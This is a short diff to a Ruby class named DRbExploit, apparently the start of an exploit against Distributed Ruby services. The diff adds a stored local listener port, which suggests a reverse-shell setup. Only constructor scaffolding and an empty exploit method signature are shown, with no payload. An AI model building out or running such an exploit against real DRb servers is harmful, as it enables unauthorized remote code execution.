@@ -4,6 +4,7 @@ require 'ostruct'
 class DRbExploit
   def initialize(host, port, lport)
     @uri = "druby://#{host}:#{port}"
+    @lport = lport
   end
 
   def exploit(payload)
